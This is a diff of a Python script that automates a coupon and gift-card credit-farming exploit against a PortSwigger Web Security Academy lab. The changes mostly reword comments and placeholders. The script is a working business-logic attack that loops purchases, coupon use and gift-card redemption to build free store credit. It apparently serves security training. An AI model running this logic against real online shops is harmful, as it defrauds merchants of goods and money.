@@ -1,29 +1,29 @@
-import requests # Import the requests module to send requests
-import re # Import the re module to match regexes
+import requests  # Import the requests module to handle HTTP requests
+import re  # Import the re module to perform regex operations
 
-# Define the lab ID
-labID = 'LAB_ID'  # <<< Replace with your lab ID
+# Define the lab ID (replace 'LabID-HERE' with the actual lab ID)
+labID = 'LabID-HERE'
 
-# Define CSRF token for all requests
+# Define CSRF token for all requests (replace 'CSRF-HERE' with the actual CSRF token)
 csrf = {
-    'csrf': 'CSRF_TOKEN'  # <<< Replace with your CSRF token
+    'csrf': 'CSRF-HERE'
 }
 
-# Authenticate using session cookie
+# Define session cookie for authentication (replace 'USER-SESSION-HERE' with the actual session cookie)
 header = {
-    'Cookie': 'session=USER_SESSION'  # <<< Replace with your session cookie
+    'Cookie': 'session=USER-SESSION-HERE'
 }
 
-# Define the URLs for each endpoint
+# Define the URLs for various endpoints in the application
 urls = {
-    'product': f'https://{labID}.web-security-academy.net/cart',  # URL to add products to the cart
-    'coupon': f'https://{labID}.web-security-academy.net/cart/coupon',  # URL to apply a coupon
-    'checkout': f'https://{labID}.web-security-academy.net/cart/checkout',  # URL to checkout the cart
-    'gift': f'https://{labID}.web-security-academy.net/gift-card',  # URL to redeem gift cards
-    'confirm': f'https://{labID}.web-security-academy.net/cart/order-confirmation?order-confirmed=true'  # URL to confirm the order
+    'product': f'https://{labID}.web-security-academy.net/cart',  # Endpoint to add products to the cart
+    'coupon': f'https://{labID}.web-security-academy.net/cart/coupon',  # Endpoint to apply a coupon
+    'checkout': f'https://{labID}.web-security-academy.net/cart/checkout',  # Endpoint to checkout the cart
+    'gift': f'https://{labID}.web-security-academy.net/gift-card',  # Endpoint to redeem gift cards
+    'confirm': f'https://{labID}.web-security-academy.net/cart/order-confirmation?order-confirmed=true'  # Endpoint to confirm the order
 }
 
-# Define the coupon to apply
+# Define the coupon details (replace 'SIGNUP30' with the actual coupon code)
 coupon = {
     'coupon': 'SIGNUP30',  # The coupon code to apply
     'csrf': csrf['csrf']  # CSRF token required for the request
@@ -31,21 +31,21 @@ coupon = {
 
 def product_info(productId, quantity):
     """
-    Prepare the data for adding a product to the cart.
+    Prepare the data payload for adding a product to the cart.
     :param productId: The ID of the product to add
     :param quantity: The quantity of the product to add
     :return: A dictionary containing the product information
     """
     data = {
-        'productId': productId,  # The ID of the product
-        'redir': 'PRODUCT',  # Redirection parameter
+        'productId': productId,  # The ID of the product to add
+        'redir': 'PRODUCT',  # Redirection parameter after adding the product
         'quantity': min(quantity, 99)  # Limit the quantity to a maximum of 99
     }
     return data
 
 def add_product_to_cart(data):
     """
-    Add a product to the cart.
+    Add a product to the cart by sending a POST request.
     :param data: The product information (ID and quantity)
     """
     try:
@@ -56,7 +56,7 @@ def add_product_to_cart(data):
 
 def apply_coupon():
     """
-    Apply a coupon to the cart.
+    Apply a coupon to the cart by sending a POST request.
     """
     try:
         requests.post(url=urls['coupon'], data=coupon, headers=header)  # Send a POST request to apply the coupon
@@ -66,33 +66,36 @@ def apply_coupon():
 
 def checkout_cart():
     """
-    Checkout the cart and retrieve gift cards from the confirmation page.
+    Checkout the cart and retrieve gift card codes from the confirmation page.
     :return: A list of gift card codes
     """
     try:
-        requests.post(url=urls['checkout'], data=csrf, headers=header)  # Send a POST request to checkout the cart
-        confirm = requests.get(url=urls['confirm'], headers=header)  # Send a GET request to the confirmation page
+        # Send a POST request to checkout the cart
+        requests.post(url=urls['checkout'], data=csrf, headers=header)
+        # Send a GET request to the order confirmation page
+        confirm = requests.get(url=urls['confirm'], headers=header)
         print("Checked out successfully.")
 
-        response_content = confirm.content.decode('utf-8')  # Decode the response content to a string
-        gift_cards = re.findall(r'<td>(.*?)</td>', response_content)[5:]  # Extract gift card codes from the response
+        # Extract gift card codes from the confirmation page using regex
+        gift_cards = re.findall(r'<td>(.*?)</td>', confirm.text)[5:]
         return gift_cards
     except requests.RequestException as e:
         print(f"Failed to checkout: {e}")
 
 def redeem_gift_cards(gift_cards):
     """
-    Redeem a list of gift cards.
+    Redeem a list of gift cards by sending POST requests.
     :param gift_cards: A list of gift card codes to redeem
     """
     for card in gift_cards:
         try:
             data = {
-                'gift-card': card,  # The gift card code
+                'gift-card': card,  # The gift card code to redeem
                 'csrf': csrf['csrf']  # CSRF token required for the request
             }
 
-            response = requests.post(url=urls['gift'], data=data, headers=header)  # Send a POST request to redeem the gift card
+            # Send a POST request to redeem the gift card
+            response = requests.post(url=urls['gift'], data=data, headers=header)
             if 'Invalid gift card' in response.text:  # Check if the gift card is invalid
                 break  # Stop redeeming if an invalid gift card is encountered
             else:
@@ -102,30 +105,36 @@ def redeem_gift_cards(gift_cards):
 
 def start(credit=100):
     """
-    Main function to add products to the cart, apply coupons, and redeem gift cards until the required credit is reached.
+    Main function to automate adding products, applying coupons, and redeeming gift cards
+    until the required store credit is reached.
     :param credit: The initial store credit
     """
-    while credit < 935.90:  # Target credit amount to purchase the jacket
+    while credit < 935.90:  # Target credit to purchase the jacket
         try:
             print(f'Current credit: {credit}')
-            add_product_to_cart(product_info(2, credit // 7))  # Add gift cards to the cart
-            apply_coupon()  # Apply the coupon
-            gift_cards = checkout_cart()  # Checkout the cart and retrieve gift cards
-            redeem_gift_cards(gift_cards)  # Redeem the retrieved gift cards
+            # Add gift cards to the cart
+            add_product_to_cart(product_info(2, credit // 7))
+            # Apply the coupon
+            apply_coupon()
+            # Checkout the cart and retrieve gift cards
+            gift_cards = checkout_cart()
+            # Redeem the retrieved gift cards
+            redeem_gift_cards(gift_cards)
 
-            response = requests.get(url=urls['product'], headers=header)  # Get the updated store credit
-            response_content = response.content.decode('utf-8')  # Decode the response content to a string
-            credit = re.findall(r'Store credit:.{2}(\d*)', response_content)  # Extract the store credit
+            # Get the updated store credit from the product page
+            response = requests.get(url=urls['product'], headers=header)
+            credit = re.findall(r'Store credit:.{2}(\d*)', response.text)  # Extract the store credit using regex
             credit = int(''.join(credit))  # Convert the extracted credit to an integer
         except requests.RequestException as e:
             print(f"Failed to retrieve store credit: {e}")
             break
     else:
         print(f'Current credit: {credit}')
-        add_product_to_cart(product_info(1, 1))  # Add the jacket to the cart
-        apply_coupon()  # Apply the coupon
-        gift_cards = checkout_cart()  # Checkout the cart
-        redeem_gift_cards(gift_cards)  # Redeem any remaining gift cards
-        print("You've got the leather jacket, and probably solved the lab!")
+        # Add the jacket to the cart
+        add_product_to_cart(product_info(1, 1))
+        # Apply the coupon
+        apply_coupon()
+        print('- Total price is within the desired range amount!\n- Now you\'re able to checkout the "Lightweight l33t leather jacket"!\n- I know it\'s more fun to buy it by yourself😉')
 
-start() # Start the program
+# Start the program
+start()
